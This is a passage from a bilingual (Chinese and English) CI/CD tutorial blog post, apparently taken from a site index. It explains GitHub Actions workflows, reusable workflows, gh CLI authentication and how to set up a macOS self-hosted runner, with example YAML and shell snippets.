ENV，gh 才有權限操作 # https://docs.github.com/en/actions/how-tos/security-for-github-actions/security-guides/use-github_token-in-workflows GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} # ${{ github.xxx }} 是 GitHub Actions Context 表達式 # 不是 Shell 變數，而是 YAML 解析階段由 GitHub Actions 替換成對應值 # 其他參數：https://docs.github.com/en/actions/learn-github-actions/contexts#github-context PR_NUMBER: ${{ github.event.pull_request.number }} AUTHOR_TAG: '@${{ github.event.pull_request.user.login }}' run: | PR_BODY=$(gh pr view $PR_NUMBER --repo ${{ github.repository }} --json body -q \".body\") NEW_BODY=$(printf \"%s\\n\\nCreated by %s\" \"$PR_BODY\" \"$AUTHOR_TAG\") gh pr edit $PR_NUMBER --repo ${{ github.repository }} --body \"$NEW_BODY\"完整程式碼： Automation-PullRequest.yml開 PR 時會自動在描述後加上作者資訊、Slack 訊息也會正確的標記作者：問題 5. GitHub 瘋狂寄通知信到信箱很干擾：GitHub Repo 通知跟 Slack 都有設定好之後，統一都在 Slack 收通知了，可以去 GitHub 個人設定把 Email 通知關掉：其他Actions 目前沒有目錄結構，但可以在 Actions 頁，置頂(Pin) 五個 Actions；也可以使用 Disable 暫停某個 Action。可以在 Insights 查看 GitHub Actions 用量跟執行成效：Reuse Workflow 補充下一篇文章 有用到同個 Repo 拆 Reuse Workflow，這邊補充一下不同 Repo 拆 Reuse Workflow 的範例。先定義一個 Reuse Workflow: Automation-label-pr-base-branch.yml: 在 ZhgChgLi/github-actions-ci-cd-demo-share-actions Repo 。name: Automation-label-pr-base-branchrun-name: \"[Automation-label-pr-base-branch] ${{ github.event.inputs.PR_NUMBER || github.ref }}\"concurrency: group: ${{ github.workflow }}-${{ github.event.inputs.PR_NUMBER || github.ref }} cancel-in-progress: true# 觸發事件on: # 其他 Workflow 呼叫此 Workflow 觸發 workflow_call: # 資料輸入 inputs: # PR Number PR_NUMBER: required: true type: string # 密鑰輸入 secrets: GH_TOKEN: description: \"GitHub token for API access\" required: truejobs: label-pr-base-branch: name: Label PR Base Branch continue-on-error: true timeout-minutes: 10 runs-on: ubuntu-latest steps: - name: Label PR by Base Branch id: label-pr-base-branch env: GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} run: | PR_NUMBER=\"${{ inputs.PR_NUMBER }}\" REPO=\"${{ github.repository }}\" echo \"📦 Processing PR #$PR_NUMBER in repo $REPO\" # 取得 PR 的 base branch BASE_BRANCH=$(gh pr view \"$PR_NUMBER\" --repo \"$REPO\" --json baseRefName --jq '.baseRefName') echo \"🔖 PR Base Branch: $BASE_BRANCH\" # 允許的 base branch labels BRANCH_LABELS=(\"develop\" \"main\" \"master\") # Label 是否在允許列表 if [[ \" ${BRANCH_LABELS[@]} \" =~ \" ${BASE_BRANCH} \" ]]; then LABEL=\"$BASE_BRANCH\" else echo \"⚠️ Base branch '$BASE_BRANCH' not in allowed list, skipping label.\" exit 0 fi # 移除現有的 base branch labels EXISTING_LABELS=$(gh pr view \"$PR_NUMBER\" --repo \"$REPO\" --json labels --jq '.labels[].name') for EXISTING in $EXISTING_LABELS; do if [[ \" ${BRANCH_LABELS[@]} \" =~ \" ${EXISTING} \" ]]; then echo \"🧹 Removing existing base branch label: $EXISTING\" gh pr edit \"$PR_NUMBER\" --repo \"$REPO\" --remove-label \"$EXISTING\" fi done # 如果 Label 不存在則建立 if ! gh label list --repo \"$REPO\" | grep -q \"^$LABEL$\"; then echo \"🆕 Creating missing label: $LABEL\" gh label create \"$LABEL\" --repo \"$REPO\" --description \"PR targeting $LABEL branch\" --color \"ededed\" else echo \"✅ Label '$LABEL' already exists\" fi # 加上 base branch label echo \"🏷️ Adding label '$LABEL' to PR #$PR_NUMBER\" gh pr edit \"$PR_NUMBER\" --repo \"$REPO\" --add-label \"$LABEL\"回到我們的 主 ZhgChgLi/github-actions-ci-cd-demo Repo， 新增一個主 Workflow Demo-Reuse-Action-From-Another-Repo.yml :name: Automation-label-pr-base-branchon: pull_request: types: [opened]jobs: call-label-pr-workflow: name: Call Base Branch Label Workflow # ✅ 如果被呼叫的 workflow 在同一個 repo： # uses: ./.github/workflows/Automation-label-pr-base-branch.yml # 注意：這種寫法無法指定分支（固定使用 caller workflow 的 branch） # 參考範例： # - CD-Deploy-Form.yml 呼叫本 repo workflow # - CD-Deploy.yml 呼叫跨 repo workflow # # ✅ 如果被呼叫的 workflow 在其他 repo： # uses: {owner}/{repo}/.github/workflows/{file}.yml@{branch_or_tag} # 可以指定 branch 或 tag # ref: https://github.com/ZhgChgLi/github-actions-ci-cd-demo-share-actions/blob/main/.github/workflows/Automation-label-pr-base-branch.yml uses: ZhgChgLi/github-actions-ci-cd-demo-share-actions/.github/workflows/Automation-label-pr-base-branch.yml@main with: PR_NUMBER: ${{ github.event.number }} # 如果所有 secrets 都要繼承 caller workflow，直接用 `inherit` # secrets: inherit # # 如果只要傳特定 secrets，個別指定 secrets: GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}Commit 檔案後開 PR 試試看。工作流程：主 Repo 的 Demo-Reuse-Action-From-Another-Repo.yml → 呼叫並把參數傳到另一個 Repo 的 Automation-label-pr-base-branch.yml 執行任務 → 回到主 Repo 回報結果。成功！Private Repo 存取問題這邊要注意一個安全性問題，Public Repo 完全沒問題，但如果 Reuse Workflow 在 Private Repo 當中，只有在 同個組織下的其他 Repo + Repo 同樣也是 Private + 設定允許 =才能存取使用 Private Repo Reuse Workflow。 Public — ZhgChgLi/ReuseRepo + Private or Public-ZhgChgli or harry/myRepo = ✅ Private — ZhgChgLi/ReuseRepo + Private or Public— harry/myRepo = ❌ Private — ZhgChgLi/ReuseRepo + Public — ZhgChgLi/anotherRepo = ❌ Private — ZhgChgLi/ReuseRepo + Private — ZhgChgLi/anotherRepo = ✅設定允許的方式，要去 Reuse Workflow Repo → Settings → Actions → General → Acces:改勾選：Accessible from repositories in the 'ZhgChgLi' organizationWorkflows in other repositories that are part of the 'ZhgChgLi' organization can access the actions and reusable workflows in this repository. Access is allowed only from private repositories.點擊「Save」儲存，完成。如果沒權限存取會出現以下錯誤訊息：Invalid workflow file: .github/workflows/Demo-reuse-action-from-another-repo.yml#L21error parsing called workflow\".github/workflows/Demo-reuse-action-from-another-repo.yml\"-&gt; \"ZhgChgLi/github-actions-ci-cd-demo-share-actions/.github/workflows/Automation-label-pr-base-branch.yml@main\": workflow was not found.GitHub Actions Script 語法補充補充一下大家可能會感到疑惑的 ${{ XXX }} or ${XXX} or $XXX 變數語法。Demo-Env-Vars- .yml:name: Demo-Env-Varson: workflow_dispatch:jobs: print-env-vars: runs-on: ubuntu-latest steps: - name: print-env run: env - name: context-vars-vs-vars env: SAY_MY_NAME: \"Heisenberg\" # GitHub Actions Context 表達式，同下方解釋 FROM_REF: \"${{ github.ref }}\" run: | # Sehll Script: # 引用自訂注入的 ENV 變數內容 # ${SAY_MY_NAME} or $SAY_MY_NAME 都可以 # ${XX} 遇到字串拼接比較好用: echo \"HI: ${SAY_MY_NAME}\" # 💡 GitHub Actions Context 表達式 # 這不是 shell 變數，而是 YAML 解析階段由 GitHub Actions 替換成對應值 # ⚠ 在本機或非 GitHub Actions 環境執行會失敗 # 🔗 https://docs.github.com/en/actions/learn-github-actions/contexts#github-context BRANCH_NAME_FROM_CONTEXT=\"${{ github.ref }}\" # 💡 GitHub Actions 執行階段的環境變數 # 這些變數在 runner 執行 shell 時由 GitHub Actions 自動注入 # ✅ 在其他環境可用 export 或 ENV 預先定義相同變數 # 🔗 https://docs.github.com/en/actions/learn-github-actions/environment-variables BRANCH_NAME_FROM_ENV_VARS=\"${GITHUB_REF}\" echo \"FROM_REF: ${FROM_REF}\" echo \"BRANCH_NAME_FROM_CONTEXT: ${BRANCH_NAME_FROM_CONTEXT}\" echo \"BRANCH_NAME_FROM_ENV_VARS: ${BRANCH_NAME_FROM_ENV_VARS}\" - name: print-github-script-env uses: actions/github-script@v7 env: SAY_MY_NAME: \"Heisenberg\" # GitHub Actions Context 表達式，同上方解釋 FROM_REF: \"${{ github.ref }}\" with: script: | // GitHub Script: (JavaScript (Node.js)): // 從 process.env 取 ENV 值 console.log(`HI: ${process.env.SAY_MY_NAME}`); console.log(`FROM_REF: ${process.env.FROM_REF}`); // github-script 中會自動注入到 context 變數供 javascript 直接引用 // https://docs.github.com/en/actions/learn-github-actions/contexts#github-context const branch_name_from_context_vars = context.ref; console.log(`branch_name_from_context_vars: ${branch_name_from_context_vars}`); // 同樣也能用 GitHub Actions Context 表達式(只是意義不大): const branch_name_from_context = \"${{ github.ref }}\"; console.log(`branch_name_from_context: ${branch_name_from_context}`); for (const [key, value] of Object.entries(process.env)) { console.log(`${key}=${value}`); } // github-script 中的 github 物件是 Octokit REST API 實例 // 用來操作 github api 使用 // 例如： // await github.rest.pulls.list({ // owner: context.repo.owner, // repo: context.repo.repo, // state: \"open\" // }); # gh CLI does NOT use GITHUB_TOKEN by default; requires GH_TOKEN - name: gh CLI without GH_TOKEN (expected to fail) continue-on-error: true run: | PR_COUNT=$(gh pr list --repo $GITHUB_REPOSITORY --json number --jq 'length') echo \"Found $PR_COUNT open pull requests\" - name: gh CLI with GH_TOKEN (expected to succeed) env: # Assign GH_TOKEN so gh CLI can authenticate # https://docs.github.com/en/actions/how-tos/security-for-github-actions/security-guides/use-github_token-in-workflows GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} run: | PR_COUNT=$(gh pr list --repo $GITHUB_REPOSITORY --json number --jq 'length') echo \"Found $PR_COUNT open pull requests\" - name: github-script auto-authentication (no GH_TOKEN needed) uses: actions/github-script@v7 with: script: | // github = Octokit REST client (auto-authenticated with GITHUB_TOKEN) const pulls = await github.rest.pulls.list({ owner: context.repo.owner, repo: context.repo.repo, state: \"open\" }); console.log(`Found ${pulls.data.length} open pull requests`);${ { XXX } } GitHub Actions Context 表達式 ${{ XXX }} 是 GitHub Actions Context 表達式， 在YAML 解析階段由 GitHub Actions 替換成對應值 (如上圖 BRANCH_NAME_FROM_CONTEXT ) 完整可用表達式可 參考官方文件 ${XXX} or $XXX 是真實環境變數， ${XXX} 在字串拼接比較好用 GitHub Actions 預設會注入一些環境變數，完整可 參考官方文件actions/github-script@v7 在 github-script 中同樣可以用 ${{ XXX }} 是 GitHub Actions Context 表達式，但是意義不大；因為 在 github-scirpt 環境中預設會注入 context 變數可以直接在 javascript 中引用 在 github-script 中 github 物件是 Octokit REST API 實例 github-script 也能從 env: 注入變數，但是要用 ${process.env.xxx} 存取 同樣預設會注入一些環境變數，完整可 參考官方文件 ${process.env.xxx} 存取；但是已經有 context 變數了，從這存取意義也不大 github-script 會自動帶入 github-token ，無需指定gh cli GH_TOKEN 在 GitHub Actions Shell Script 使用 gh cli 需指定 GH_TOKEN 參數 可以直接帶入預設 Token — secrets.GITHUB_TOKEN (GitHub Actions 執行時自動產生) 預設 Token 有一些基本權限，如果要操作的指令權限不夠就要改用 Personal Access Token ，團隊使用建議用共用帳號建立 PAT。完整程式碼： Demo-Env-Vars- .ymlGitHub Actions 已經開發好了，下一步我們可以抽換 GitHub Hosted Runner 成自己的 Self-hosted Runner。 GitHub Hosted Runner 有免費額度 2,000 分鐘一個月(起)，跑這種小的自動化任務花不了多少時間，而且是跑在 linux 機器花費很低，可能還用不到免費上限； 不一定要改成 Self-hosted Runner ，改 Runner 還要確保 Runner 環境正確(例如 GitHub Hosted Runner 自帶 gh cli，self-hosted Runner 就記得要自己安裝好)， 本文純粹是因為教學才會這樣抽換 。 如果是用在執行 CI/CD 任務才必須要用 Self-hosted Runner。新增 Self-hosted Runner 本文以 macOS M1 為例。 Settings → Actions → Runners → New self-hosted runner。 Runner image: macOS Architecture : M1 記得選 ARM64 執行比較快在實體電腦上開一個 Termnial。按照 Download 步驟在本地電腦完成：# 在你想要的路徑，建立 Runner 目錄mkdir actions-runner &amp;&amp; cd actions-runner# 下載 Runner imagecurl -o actions-runner-osx-x64-2.325.0.tar.gz -L https://github.com/actions/runner/releases/download/v2.325.0/actions-runner-osx-x64-2.325.0.tar.gz# Optional: Validate the hashecho \"0562bd934b27ca0c6d8a357df00809fbc7b4d5524d4aeb6ec152e14fd520a4c3 actions-runner-osx-x64-2.325.0.tar.gz\" | shasum -a 256 -c# 解壓縮tar xzf ./actions-runner-osx-x64-2.325.0.tar.gz 以上只是參考；建議照你設定頁裡的步驟來做，才會是最新版本的 Runner image。設定 Configure:# 請參考設定頁指令，Token 會隨時間改變./config.sh --url https://github.com/ORG/REPO --token XXX會依序要你輸入： Enter the name of the runner group to add this runner to: [press Enter for Default] 直接 Enter *只有註冊到 Organization 組織層級的 Runner 才有 Group 分組功能 Enter the name of runner: [press Enter for ZhgChgLideMacBook-Pro] 可以輸入想設定的 Runner 名稱 e.g. app-runner-1 或直接 Enter This runner will have the following labels: ‘self-hosted’, ‘macOS’, ‘X64’Enter any additional labels (ex. label-1,label-2): [press Enter to skip] 輸入想要設定的 Runner label，可以多輸入自訂 Label 方便之後使用 同前述 GitHub Acitons/Runner 是依照對應 Label 找任務來做， 如果只用 default label，Runner 可能會撿到組織內的其他 Runner 來執行工作，自訂一個最保險 。 這邊我自己亂定了一個 label self-hosted-zhgchgli Enter name of work folder: [press Enter for _work] 直接 Enter出現 √ Settings Saved. 代表設定完成了。啟動 Runner:./run.sh出現 √ Connected to GitHub、Listening for Jobs 就代表已經在監聽 Actions 任務了： 這個 Terminal 視窗不關閉就會持續接收任務來做。 🚀🚀🚀同一台電腦開多個 Terminal 在不同目錄就能起多個 Runner。回到 Repo 設定頁也能看到 Runner 正在等待任務：Status: Idle: 閑置，在等待任務 Active: 有任務正在執行 Offline: Runner 不在線上Workflow(GitHub Actions) Runner 改用 Self-hosted Runner以 Automation-PullRequest.yml 為例：# 請參考前文，略....jobs: label-pr-by-file-count: # 請參考前文，略.... runs-on: [self-hosted-zhgchgli] # 請參考前文，略.... # --------- assign-self-if-no-assignee: # 請參考前文，略.... runs-on: [self-hosted-zhgchgli] steps: # 請參考前文，略....Commit 檔案到 Repo 主分支之後，重新開 PR 觸發驗證一下 Actions。回到 Runner Terminal 就能看到有新的任務進來了，正在執行跟執行結果：失敗了，因為我本機電腦沒有安裝 gh cli 環境：使用 brew install gh 在實體電腦上安裝完 gh 後再次觸發執行：成功！現在這個任務就完全是使用我們自己的電腦在執行，不使用 GitHub Hosted Runner、不計費使用。我們可以點進去 Action Log 查看任務執行在的 Runner、機器是哪一個：runs-on: [ Runner Label] 設定這裡是 AND 不是 OR，GitHub Runner 暫不支援 OR 挑選 Runner 執行。例如： [self-hosted, macOS, app] → 代表 Runner 要 同時有 self-hosted, macOS, app 這 3 個 Labels 才會匹配接任務來執行。如果一個 Job 想同時測試不同 Runner 環境下的結果可以使用 matrix 參數：jobs: test: runs-on: ${{ matrix.runner }} strategy: matrix: runner: - [self-hosted, linux, high-memory] - [self-hosted, macos, xcode-15] steps: - run: echo \"Running on ${{ matrix.runner }}\"這樣這個 Job 會在下列兩個 Runner Labels Runner 中並行各執行一次： self-hosted, linux, high-memory self-hosted, macos, xcode-15 Runner 暫不支援： - OR 挑選 Runner - Runner 權重設定註冊 Runner 成 Service可以參考官方文件「 Configuring the self-hosted runner application as a service 」將 Runner 直接註冊成系統 Service，這樣就能在背景執行(不用開 Terminal 在前景)、開機後也會自動啟動。有多個 Runner 記得調整「 Customizing the self-hosted runner service 」設定註冊不同名稱。 iOS 這邊我有一個待研究排除的問題， 就是我改用背景 Service 之後在 Archive 會遇到錯誤(疑似是跟 keychain 權限有關) ，當時沒時間解決，就先用起前景 Terminal Runner 了。如果是傳統前景要做到開機自動啟動就要去 ~/Library/LaunchAgents 新增一個自動啟動設定檔案：actions.runner.REPO.RUNNER_NAME.plist ：&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;&lt;plist version=\"1.0\"&gt; &lt;dict&gt; &lt;key&gt;Label&lt;/key&gt; &lt;string&gt;actions.runner.REPO.RUNNER_NAME&lt;/string&gt; &lt;!-- 指定 Terminal.app 來啟動 --&gt; &lt;key&gt;ProgramArguments&lt;/key&gt; &lt;array&gt; &lt;string&gt;/usr/bin/open&lt;/string&gt; &lt;string&gt;-a&lt;/string&gt; &lt;string&gt;Terminal&lt;/string&gt; &lt;string&gt;/Users/zhgchgli/Documents/actions-runner/run.sh&lt;/string&gt; &lt;/array&gt; &lt;key&gt;RunAtLoad&lt;/key&gt; &lt;true/&gt; &lt;key&gt;WorkingDirectory&lt;/key&gt; &lt;string&gt;/Users/zhgchgli/Documents/actions-runner&lt;/string&gt; &lt;/dict&gt;&lt;/plist&gt; 有興趣深入研究 DevOps 的朋友可參考官方 k8s Runner 文件。完整專案 Repo官方文件更細節的設置方式請務必參考官方手冊。AI Can Help!實測給 ChatGPT 完整的步驟跟時機點就能幫你寫好 GitHub Actions 直接使用!總結現在你應該已經對 GitHub Actions + Self-hosted Runner 有了一定程度的了解，下一篇我將開始以 App (iOS) CI/CD 為案例，手把手建置整套流程。系列文章： CI/CD 實戰指南（一）：CI/CD 是什麼？如何透過 CI/CD 打造穩定高效的開發團隊？工具選擇？ CI/CD 實戰指南（二）：GitHub Actions 與 self-hosted Runner 使用與建置大全 CI/CD 實戰指南（三）：使用 GitHub Actions 實作 App 專案的 CI 與 CD 工作流程 CI/CD 實戰指南（四）：使用 Google Apps Script Web App 串接 GitHub Actions 建置免費易用的打包工具平台Buy me a coffee 本系列文章花費了大量的時間精力撰寫，如果內容對您有幫助、對您的團隊有實質提升工作效率與產品品質；歡迎請我喝杯咖啡，感謝支持！Buy me a coffee有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 191 Total Views Last Statistics Date: 2025-08-15 | 180 Views on Medium." }, { "title": "CI/CD Practical Guide (Part 2): Comprehensive Guide to Using and Building GitHub Actions and Self-hosted Runners", "url": "/posts/zrealm-dev/en/ci-cd-practical-guide-part-2-comprehensive-guide-to-using-and-building-github-actions-and-self-hosted-runners-404bd5c70040/", "categories": "ZRealm Dev.", "tags": "ios-app-development, cicd, github-actions, github, self-hosted", "date": "2025-07-02 20:22:32 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版CI/CD Practical Guide (Part 2): Comprehensive Guide to Using and Building GitHub Act...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版CI/CD Practical Guide (Part 2): Comprehensive Guide to Using and Building GitHub Actions and Self-hosted RunnersThis guide will help you understand from scratch how GitHub Actions and Self-hosted Runners operate, along with hands-on tutorials.Photo by Dan TaylorIntroductionIn the previous article, “CI/CD Practical Guide (Part 1): What is CI/CD? How to Build a Stable and Efficient Development Team through CI/CD? Tool Selection?”, we introduced what CI/CD is, the benefits it brings, and how to choose tools. This article will focus on the architecture and usage of GitHub Actions and Self-hosted Runners, guiding you step-by-step to establish several interesting automation workflows.GitHub Actions Architecture FlowchartBefore we begin, let’s clarify the operational architecture and responsibilities of GitHub Actions.GitHub Repo In the world of GitHub Actions, all Actions (Workflow YAML files) must be stored in a Git Repo ( REPO/.github/workflows/ )GitHub Repo — Actions SecretsRepo → Settings → Secrets and variables → Actions → Secrets. Stores Secret Keys and Tokens used in Actions stepse.g. Slack Bot Token, Apple Store Connect API .p8 Key Secrets content cannot be viewed in Action Logs and will be automatically obscured with * * * * Secrets content cannot be viewed or edited, only overwritten Secrets currently only support plain text content and cannot upload files - For binary keys, please refer to the official steps to store them after converting to Base64 encoding.- For iOS development certificate storage methods, refer to the official tutorial: Installing an Apple certificate on macOS runners for Xcode development Organization-level Secrets can be stored and shared across Repos.GitHub Repo — Actions VariablesRepo → Settings → Secrets and variables → Actions → Variables. Stores commonly used variables in Actions stepse.g. Simulator iOS version, working directory Variables content can be viewed and edited Variables content can be output in Action Logs Variables only support plain text, but can also store JSON strings for parsing and use Organization-level Variables can be stored and shared across Repos.GitHub Actions — Trigger The most important starting point in GitHub Actions — Trigger Events (Conditions) Only GitHub Actions that meet the trigger events will be executed A complete list of events can be found in the official documentation It basically covers all CI/CD and automation scenarios encountered.However, if there are special scenarios without events, you can only use other events + conditions in Jobs or use Schedule to manually check.e.g. If there is no PR Merged event, you can only use pull_request: closed + Job if: github.event.pull_request.merged == true to achieve it.Commonly Used Events: schedule (cron): Scheduled execution (like crontab)Can be used for automation: regularly checking PRs, packaging, executing automation scriptsAll executed in main / develop (Default Branch). pull_request: PR related eventsTriggered when a PR is opened, assigned, labeled, or has a new Push Commit, etc. issues, issue_comment: Issue related eventsTriggered when an Issue is opened or has new comments, etc. workflow_dispatch: Manually triggered; fields can be set for user input, and GitHub Actions provides a simple form for users to fill in information.e.g.: workflow_call: Triggers another Action (Workflow) to execute tasks. workflow_run: Triggered when another Action (Workflow) executes a task. For more event types and configuration details, please refer to the official documentation.GitHub Actions — Workflow Also known as Action Written in YAML format, with files stored in REPO/.github/workflows/ The Workflow YAML file in the main branch is the primary one If you cannot see the Action being developed in other branches or if there are execution errors, try merging back to the main branch. The most basic unit in GitHub Actions, each Workflow represents a CI/CD or automation operation Workflows can call other Workflows to execute tasks(You can use this feature to separate core Workflows from called Workflows) It defines task names, execution strategies, trigger events, task operations, and all Action-related settings Currently, the file structure does not support subdirectories Actions are completely free (Public and Private Repos)GitHub Actions — Workflow — Job The execution unit in GitHub Actions Defines what tasks are included in the Workflow Each Workflow can have multiple Jobs Each Job needs to specify which Runner Label to use, and the corresponding Runner machine will execute the task Multiple Jobs are executed concurrently (if there is a sequence, you can use needs constraints) Each Job should be treated as an independent execution entity (each should be considered a Sandbox), if a Job ends and produces resource files for subsequent Jobs/Workflows, you need to Upload Artifacts or move them to a shared output directory in self-hosted. A Job can output strings for reference by other Jobs.(e.g. execution result true or false) Unless special process conditions are set, if one of the Jobs encounters an error, the other Jobs will still continue to execute.GitHub Actions — Reuse Workflow/Job Define on: workflow_call in the Workflow to encapsulate it for reuse as a Job in other Workflows Can be shared across Repos within the same organization Therefore, you can place CI/CD tasks that are shared across Repos into a shared Repo for use.GitHub Actions — Workflow — Job — Step The smallest execution unit in GitHub Actions The program that actually executes tasks in a Job Each Job can have multiple Steps Multiple Steps are executed in order A Step can output strings for reference by subsequent Steps. Steps can directly write shell script programs You can reference gh cli, current environment variables (e.g., obtaining PR numbers), and directly perform the desired actions. Unless special process conditions are set, if a Step encounters an error, it will terminate immediately, and subsequent Steps will not execute.GitHub Actions — Workflow — Job — Reuse Action Step You can directly reuse existing steps packaged by various experts on the Marketplace For example: Comment content to PR. You can also package a series of task Steps into an Action GitHub Repo for reuse by other workflows. Actions from Public Repos can be listed on the Marketplace.Packaging Actions supports: Docker Action — Indicates that GitHub Actions will pass environment variables to the Docker container, and you can handle them as needed, whether it be shell scripts, Java, PHP, etc. JavaScript/TypeScript Action — Directly use node.js to write the logic for GitHub Actions, and the environment variables will also be passed for your reference.e.g. pozil/auto-assign-issue Composite (YAML) — Pure YAML describing task steps (same as GitHub Actions — Workflow — Job — Step) can declare which steps to perform or directly write shell scripts.e.g. ZhgChgLi/ZReviewTender Due to space constraints, this article will not cover how to package GitHub Actions. For those interested, please refer to the official documentation: tutorials/creating-a-composite-action.GitHub Runner GitHub will dispatch corresponding Jobs to Runners based on Runner Labels Runners only act as listeners, polling to listen for tasks dispatched by GitHub They only care about Jobs, not which Action (Workflow) it isThus, you may see that after Action A’s Job-1 completes, the next one might be Action B’s Job-1, rather than completing all of Action A’s Jobs before switching to Action B. Runners can use GitHub Hosted Runners or Self-hosted Runners.GitHub Hosted Runner Runners provided by GitHub, you can refer to the official Repo list:Images list from June 2025 You can check what is pre-installed on the Runners:e.g. macos-14-arm64macos-14-arm64 For iOS development, it is recommended to use the -arm64 (M series) processor Runners for faster performance. Just paste the YAML Label from the table in the Job run-on to use that Runner for executing tasks. Public Repo pricing: Completely free with unlimited usage. ️ Private Repo free tier:Free tier (varies by account type, for GitHub Free as an example):Usage: 2,000 minutes free per monthStorage: 500 MB ⚠️️Private Repo billing method: Billing starts after exceeding the free tier (you can set limits and notifications), and the pricing varies based on the operating system and core of the Runner:about-billing-for-github-actionsYou can see that the price for macOS is high due to the high equipment costs. Maximum concurrent task limits:usage-limits-billing-and-administration We’ve digressed too much; our focus is on Self-hosted Runners.Self-hosted Runner on In-house Server Use your own machine as a Runner A physical machine can run multiple Runners concurrently to accept tasks Free unlimited usage Only the cost of purchasing the machine, use it as much as you want after a one-time investment!For example, if you calculate with a 32G RAM M4 Mini (≈NT$40,900), using GitHub Hosted Runners for a month would cost 500 USD; buying one and setting it up would pay off in just over three months! Supports Windows, macOS, Linux (x64/ARM/ARM64) Runners can be shared across Repos within the same organization ⚠️Currently: actions/cache, actions/upload-artifact, actions/download-artifact only support GitHub cloud services, meaning that this content will still be uploaded to GitHub servers and counted towards storage fees. You can set up a shared directory on your own machine instead. Self-hosted Runners also support Docker, k8s, but I haven’t researched that. Setting up a Self-hosted Runner only takes a few steps (set up within 10 minutes) to go online and start accepting tasks (this article will introduce it later).GitHub Workflow x Job x Step x Runner Relationship FlowchartThis diagram summarizes the workflow and relationships, assuming we have two Workflows and two Runners: CI — Assume R has 3 Jobs, each Job has several Steps, Runner Label (run-on) — self-hosted-app CD — Has 4 Jobs, each Job has several Steps, Runner Label (run-on) — self-hosted-app Runners — There are 2, both with the Runner Label — self-hosted-appAs mentioned earlier, Runners and Workflows are dispatched and received based on Runner Labels. In this case, all use the same self-hosted-app Runner Label. The Jobs in the Workflow are executed concurrently by default, while the Steps are the actual execution content of each Job, executed sequentially in order. Once all Steps are completed, the Job is considered finished. Therefore, the actual execution timeline of the Workflow will traverse between the two Runners executing Jobs, and they will execute concurrently. The next Job executed may not necessarily be the next Job in the same Workflow. ⚠️ This is why it’s important to ensure that each Job is independent (especially in a Self-hosted Runner environment, where the output of one Job may not be cleaned up thoroughly after completion, leading us to subconsciously think that the output of this Job can be used by the next Job), and this should not be the case.If a Job produces output for subsequent Jobs to use: Job Output String: Outputs plain text to variables for reference by other Jobs Artifact-upload/download: The last step of a Job uploads the execution result to GitHub Artifact, and the first step of another Job downloads it for further processing.e.g. For example, Job — packaging → uploads the packaging result .ipa to Artifact → Job — deployment → downloads the .ipa → uploads to App Store for deployment.Note: Currently, even if it’s Self-hosted, it will still go to GitHub Artifact cloud storage. AWS/GCP… cloud storage: Same as above, but using your own cloud storage service. [Self-hosted Only] Shared hard drive, directory: If Self-hosted Runners are all mounted to a shared directory, you can create folders based on UUID to store output results, and subsequent Jobs can read the previous Job’s Output UUID to find the corresponding storage and retrieve it for use.Note: Runners on different machines must also mount the same shared directory. Complete all tasks within the same Job’s Steps.Learning by Doing GitHub Actions — Case Implementation“Better to act than to talk.” The definitions and process structure mentioned above may have left everyone a bit confused. Next, I will directly present three functional examples, guiding you through hands-on practice while explaining the concepts encountered along the way, learning about GitHub Actions through doing.Case — 1Automatically label the File Changes Size Label after creating a Pull Request to help the Reviewer organize their review tasks.Result ImageDemo PROperation Process User opens PR, reopens PR, or pushes a new commit to PR Triggers GitHub Actions Workflow Shell script retrieves the number of file changes Determines the count and labels the PR accordingly CompletedHands-On PracticeRepo → Actions → New workflow → set up a workflow yourself.File Name: Automation-PullRequest.ymlAction Workflows can have each task in a separate file or aggregate tasks with the same purpose in one file based on the triggering event. Since multiple jobs run concurrently, GitHub Actions currently does not support directory structures, so having fewer files and using hierarchical naming will make management easier.Here, all actions related to PR events are placed in the same workflow.Automation-PullRequest.yml# Workflow(Action) Namename: Pull Request Automation# Actions Log Titlerun-name: \"[Pull Request Automation] ${{ github.event.pull_request.title || github.ref }}\"# Trigger Eventson: # PR Events pull_request: # PR - Opened, Reopened, New Push Commit types: [opened, synchronize, reopened]# In the same Concurrency Group, if there is a new Job, it will cancel the one currently running# For example, if a task triggered by a Push Commit has not executed yet and another Push Commit occurs, the previous task will be canceledconcurrency: group: ${{ github.workflow }}-${{ github.ref_name }} cancel-in-progress: true# Job Items# Jobs will run concurrentlyjobs: # Job ID label-pr-by-file-count: # Job Name (optional, omitted for better readability in logs) name: Label PR by changes file count # If this Job fails, it does not affect the entire Workflow, and other Jobs continue continue-on-error: true # Set maximum Timeout to prevent endless waiting in case of anomalies timeout-minutes: 10 # Runner Label - Use GitHub Hosted Runner ubuntu-latest to execute the job # If it's a Private Repo, usage will be calculated, and exceeding limits may incur costs runs-on: ubuntu-latest # Job Steps # Steps will execute in order steps: # Step Name - name: Get changed file count and apply label # Step ID (optional, not needed if there are no subsequent Steps to reference Output) id: get-changed-files-count-by-gh # Inject external environment parameters into the runtime env: # secrets.GITHUB_TOKEN is a Token automatically generated during GitHub Actions execution, no need to set it in Secrets, it has some GitHub Repo API Scopes permissions # https://docs.github.com/en/actions/how-tos/security-for-github-actions/security-guides/use-github_token-in-workflows # The gh (GitHub) CLI needs to inject GH_TOKEN into ENV for permissions to operate GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} # Shell script # GitHub Hosted Runner has gh CLI pre-installed, no need to install it in the Job run: | # ${{ github.xxx }} is a GitHub Actions Context expression # It is not a Shell variable, but a value replaced by GitHub Actions during the YAML parsing phase # Other parameters: https://docs.github.com/en/actions/learn-github-actions/contexts#github-context # Get PR number: PR_NUMBER=${{ github.event.pull_request.number }} # Get Repo: REPO=${{ github.repository }} # Use GitHub API (gh CLI) to get the number of changed files FILE_COUNT=$(gh pr view $PR_NUMBER --repo $REPO --json files --jq '.files | length') # Print Log echo \"Changed file count: $FILE_COUNT\" 